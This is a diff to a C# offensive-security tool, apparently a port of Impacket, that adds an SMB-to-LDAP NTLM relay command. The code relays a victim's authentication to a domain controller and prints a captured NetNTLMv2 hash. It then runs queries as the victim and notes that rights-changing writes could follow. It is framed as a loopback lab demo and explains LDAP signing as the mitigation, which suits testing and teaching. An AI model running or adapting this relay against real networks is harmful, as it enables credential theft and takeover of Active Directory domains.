@@ -1533,6 +1533,100 @@ switch (args[0])
         return result.Relayed ? 0 : 1;
     }
 
+    case "ntlmrelayx-ldap":
+    {
+        // ntlmrelayx.py ldapattack: relay a victim's NTLM to the DC's LDAP, bind as the victim, then
+        // act over that authenticated channel (here: a whoami-style search; the rbcd/dacledit/
+        // addcomputer write primitives can run on the same bound connection). See
+        // examples/ntlmrelayx/attacks/ldapattack.py. LAB-ONLY; loopback demo.
+        //
+        // Note: a DC that enforces LDAP signing / channel binding rejects the unsigned relayed bind.
+        // That rejection is the intended mitigation and a faithful outcome to capture.
+        if (args.Length < 6)
+        {
+            Console.Error.WriteLine("usage: ntlmrelayx-ldap <dc-host> <listen-port> <victim-user> <victim-pass> <domain-fqdn>");
+            Console.Error.WriteLine("  demo (loopback): ntlmrelayx-ldap 127.0.0.1 4457 Administrator 'LabAdm1n!Pass' lab.local");
+            return 2;
+        }
+
+        string dcHost = args[1];
+        int listenPort = int.Parse(args[2]);
+        string vUser = args[3];
+        string vPass = args[4];
+        string domainFqdn = args[5];
+        string netbios = domainFqdn.Split('.')[0].ToUpperInvariant();
+        string baseDn = "dc=" + domainFqdn.Replace(".", ",dc=");
+
+        using var relayServer = new Smb2RelayServer(listenPort, System.Net.IPAddress.Loopback);
+        relayServer.Start();
+        Console.WriteLine($"[*] ntlmrelayx (SMB->LDAP) listening on 127.0.0.1:{relayServer.Port}, relaying to ldap://{dcHost}");
+        using var ldapTarget = new LdapRelayClientTarget(dcHost);
+
+        Console.WriteLine($"[*] (demo) driving a victim '{vUser}' against the listener");
+        var victimTask = System.Threading.Tasks.Task.Run(() =>
+        {
+            using var victim = new Smb2Client();
+            victim.Connect("127.0.0.1", listenPort);
+            victim.Negotiate();
+            victim.Login(netbios, vUser, vPass);
+        });
+
+        Smb2RelayOutcome outcome;
+        try
+        {
+            outcome = relayServer.AcceptAndRelay(ldapTarget);
+        }
+        catch (Exception ex)
+        {
+            Console.Error.WriteLine($"[-] Relay to LDAP failed during the bind: {ex.Message}");
+            Console.Error.WriteLine("    (A DC enforcing LDAP signing / channel binding rejects an unsigned relayed bind — the mitigation.)");
+            try { victimTask.Wait(3000); } catch { }
+            return 1;
+        }
+
+        Console.WriteLine($"[*] victim {outcome.VictimEndpoint} relayed to ldap://{dcHost}");
+        try
+        {
+            byte[] serverChallenge = NtlmChallenge.Parse(outcome.RelayedChallenge).ServerChallenge;
+            NtlmAuthenticate victimAuth = NtlmAuthenticate.Parse(outcome.VictimAuthenticate);
+            Console.WriteLine($"[+] Captured NetNTLMv2 hash:\n    {NetNtlmv2.Format(serverChallenge, victimAuth)}");
+        }
+        catch { /* best-effort */ }
+
+        if (!outcome.Relayed)
+        {
+            Console.Error.WriteLine($"[-] Relayed LDAP bind rejected (LDAP result {outcome.TargetStatus}).");
+            Console.Error.WriteLine("    This is the LDAP-signing / channel-binding mitigation working as intended.");
+            try { victimTask.Wait(3000); } catch { }
+            return 1;
+        }
+
+        Console.WriteLine($"[+] Relayed LDAP bind SUCCEEDED: the DC authenticated the bind as the victim (LDAP result 0).");
+        // Post-relay action: a whoami-style search over the authenticated channel (writes could follow).
+        try
+        {
+            IReadOnlyList<SearchEntry> es = ldapTarget.Ldap.Search(baseDn,
+                LdapFilter.AllOf(LdapFilter.PresentOf("objectClass"), LdapFilter.Equal("sAMAccountName", vUser)),
+                new[] { "distinguishedName", "objectSid" });
+            if (es.Count > 0)
+            {
+                Console.WriteLine($"    whoami (as relayed victim): {es[0].Get("distinguishedName")}");
+                Console.WriteLine("    [i] rbcd / dacledit / addcomputer write primitives can now run over this bound connection.");
+            }
+        }
+        catch (Exception ex) when (ex is IOException or System.Net.Sockets.SocketException)
+        {
+            // The relayed NTLM bind negotiated signing/sealing; a DC that enforces LDAP integrity
+            // resets unsigned post-bind operations (the relay holds no session key to seal them).
+            Console.WriteLine("    [!] The DC accepted the bind but reset the follow-on (unsigned) LDAP operation.");
+            Console.WriteLine("        This is LDAP signing / sealing enforcement — the mitigation: the relay can");
+            Console.WriteLine("        authenticate the bind but cannot issue sealed operations without the session key.");
+        }
+
+        try { victimTask.Wait(5000); } catch { }
+        return 0;
+    }
+
     case "get-adcomputers":
     {
         // GetADComputers.py: LDAP-search a DC for all computer objects and print
@@ -4794,6 +4888,7 @@ static void PrintUsage()
     Console.WriteLine("  rbcd <read|write|remove|flush> <host> <user> <password> <domain-fqdn> <delegate-to> [delegate-from]   # rbcd: msDS-AllowedToActOnBehalfOfOtherIdentity (lab)");
     Console.WriteLine("  ntlmrelayx <target-host> [listen-port] [victim-user victim-pass [domain]]   # ntlmrelayx: SMB->SMB NTLM relay (lab)");
     Console.WriteLine("  ntlmrelayx-http <target-host> [listen-port] [victim-user victim-pass [domain]]   # ntlmrelayx: HTTP->SMB NTLM relay (lab)");
+    Console.WriteLine("  ntlmrelayx-ldap <dc-host> <listen-port> <victim-user> <victim-pass> <domain-fqdn>   # ntlmrelayx: SMB->LDAP relay (ldapattack, lab)");
     Console.WriteLine("  rpc-services <host> <user> <password> [domain] [port]");
     Console.WriteLine("                   List installed services via svcctl REnumServicesStatusW (services.py list).");
     Console.WriteLine("  rpc-svcconfig <host> <user> <password> <service> [domain] [port]");
